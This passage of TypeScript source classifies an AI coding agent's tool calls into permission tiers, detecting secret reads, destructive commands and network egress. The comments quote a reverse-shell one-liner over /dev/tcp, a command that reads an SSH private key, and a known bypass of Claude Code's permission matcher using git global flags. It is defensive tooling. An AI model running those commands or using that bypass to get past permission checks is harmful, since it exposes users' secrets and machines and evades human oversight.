    const root = worktreeRoot.toLowerCase()
    if (target === root || target === `${root}/`) return "the whole worktree"
  }
  return null
}

function hasRemoteRsync(segment: CommandSegment): boolean {
  return (
    segment.verb === "rsync" &&
    segment.words.some((word) => word.includes("@") || word.includes("://"))
  )
}

/**
 * git options that sit between `git` and the subcommand and take a separate
 * value. `git -C /repo push` read its subcommand as `-C` before this, which is
 * the bypass filed upstream against Claude Code: options inserted between the
 * command and the subcommand defeat a matcher that expects them adjacent.
 */
const SUBCOMMAND_VALUE_FLAGS = new Set(["-c", "--git-dir", "--work-tree", "--namespace"])

/** The subcommand of a `git` or package-manager segment, skipping global flags. */
function readSubcommand(segment: CommandSegment): string {
  for (let index = 1; index < segment.words.length; index += 1) {
    const word = segment.words[index]
    if (word === undefined) break
    if (word.startsWith("-")) {
      if (SUBCOMMAND_VALUE_FLAGS.has(word)) index += 1
      continue
    }
    return word
  }
  return ""
}

function segmentOpensNetwork(segment: CommandSegment): boolean {
  if (NETWORK_VERBS.has(segment.verb)) return true
  if (segment.verb === "git") return NETWORK_GIT_SUBCOMMANDS.has(readSubcommand(segment))
  if (hasRemoteRsync(segment)) return true
  if (opensSocketDevice(segment)) return true
  const bySubcommand = NETWORK_SUBCOMMAND_VERBS[segment.verb]
  if (bySubcommand?.has(readSubcommand(segment))) return true
  const publish = NETWORK_PUBLISH_SUBCOMMANDS[segment.verb]
  return publish ? publish.has(readSubcommand(segment)) : false
}

/**
 * True when the segment redirects through bash's pseudo-device socket, which is
 * a network connection with no network verb anywhere on the line.
 * `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1` is the canonical reverse shell and is
 * a published detection indicator in its own right, so the spelling is matched
 * wherever it appears in a word rather than only after a redirect operator.
 */
function opensSocketDevice(segment: CommandSegment): boolean {
  return segment.words.some((word) => word.includes("/dev/tcp/") || word.includes("/dev/udp/"))
}

function hasNetworkVerb(segments: CommandSegment[]): boolean {
  return segments.some(segmentOpensNetwork)
}

/** Network patterns, checked in order. */
export const NETWORK_PATTERNS: CommandPattern[] = [
  {
    id: "egress-command",
    test: (_command, segments) => hasNetworkVerb(segments),
    reason: "the command opens a network channel out of this machine",
  },
]

/** What the classifier decided, and why. */
export interface ClassifiedAction {
  ruleClass: PermissionRuleClass
  /** Stable rule suffix. The evaluator emits `<class>.<ruleId>`. */
  ruleId: string
  /** One line for the user and the model. Names the pattern, never the command. */
  reason: string
}

/**
 * Classify one resolved tool call.
 *
 * Order matters and it is the order in the design record: exfiltration first,
 * because a secret leaving beats every other consideration; then destructive,
 * so `git push --force` reports as destructive rather than as the network call
 * it also is; then network; then the tool's own class. An unknown tool takes
 * `approval`, never `read-only`, because nobody has read its side effects.
 */
export function classifyToolAction(
  toolName: string,
  toolInput: Record<string, unknown>,
): ClassifiedAction {
  const secret = findSecretPath(toolInput)
  if (secret) {
    return {
      ruleClass: "exfiltration",
      ruleId: `secret-read.${secret.id}`,
      reason: `${toolName} targets ${secret.path}, which holds a secret`,
    }
  }

  const command = typeof toolInput.command === "string" ? toolInput.command : ""
  if (command.trim().length > 0) return classifyCommand(command)
  return classifyToolName(toolName)
}

/** Classify a shell command against the pattern tables, in table order. */
function classifyCommand(command: string): ClassifiedAction {
  const segments = splitCommandSegments(command)

  // A network verb is not required. The model's context is uploaded to the
  // provider by design, so a command that prints a secret has already moved it
  // off this machine by the time anything downstream could act, and the gate
  // cannot unsend a tool result. This is the same boundary the file-tool path
  // draws in `findSecretPath`, and requiring egress here would have left
  // `cat ~/.ssh/id_ed25519` in the approval class, which Agent mode allows.
  if (commandReadsSecret(segments)) {
    const egress = hasNetworkVerb(segments)
    return {
      ruleClass: "exfiltration",
      ruleId: egress ? "secret-egress" : "secret-command",
      reason: egress
        ? "the command sends a secret path over a network channel"
        : "the command names a secret location, so anything it prints enters the model's context",
    }
  }

  const destructive = firstMatch(DESTRUCTIVE_PATTERNS, command, segments, "destructive")
  if (destructive) return destructive

  const network = firstMatch(NETWORK_PATTERNS, command, segments, "network")
  if (network) return network

  return {
    ruleClass: "approval",
    ruleId: "shell-command",
    reason: "a shell command that matches no dangerous pattern",
  }
}

/** The first pattern that matches, or null when the command matches none. */
function firstMatch(
  patterns: CommandPattern[],
  command: string,
  segments: CommandSegment[],
  ruleClass: ClassifiedAction["ruleClass"],
): ClassifiedAction | null {
  for (const pattern of patterns) {
    if (pattern.test(command, segments)) {
      return { ruleClass, ruleId: pattern.id, reason: pattern.reason }
    }
  }
  return null
}

/** Classify a call that carries no shell command, by the tool's own name. */
function classifyToolName(toolName: string): ClassifiedAction {
  if (NETWORK_TOOLS.has(toolName)) {
    return {
      ruleClass: "network",
      ruleId: "network-tool",
      reason: `${toolName} reaches a host this app does not control`,
    }
  }

  if (READ_ONLY_TOOLS.has(toolName)) {
    return {
      ruleClass: "read-only",
      ruleId: "read-only-tool",
      reason: `${toolName} reads without changing anything`,
    }
  }

  if (FILE_EDIT_TOOLS.has(toolName)) {
    return { ruleClass: "approval", ruleId: "file-edit", reason: `${toolName} changes a file` }
  }

  return {
    ruleClass: "approval",
    ruleId: "unclassified-tool",
    reason: `${toolName} has no classification, so it takes the middle tier`,
  }
}

/**
 * The text an allow-list rule matches against: the shell command for Bash, the
 * path for a file tool, the URL for a fetch, the pattern for a search.
 *
 * `relativePath` lets the caller pass the worktree-relative form of a path, so
 * `Edit(src/*)` matches even though the provider handed over an absolute one.
 */
export function toolMatchText(
  toolName: string,
  toolInput: Record<string, unknown>,
  relativePath?: string,
): string {
  if (toolName === "Bash" && typeof toolInput.command === "string") return toolInput.command
  if (relativePath !== undefined) return relativePath
  if (typeof toolInput.url === "string") return toolInput.url
  if (typeof toolInput.pattern === "string") return toolInput.pattern
  for (const key of PATH_INPUT_KEYS) {
    const value = toolInput[key]
    if (typeof value === "string") return value
  }
  return ""
}

/** True when a path is markdown, the one write plan mode allows. */
export function isMarkdownPath(candidate: string): boolean {
  return /\.md$/i.test(candidate)
}
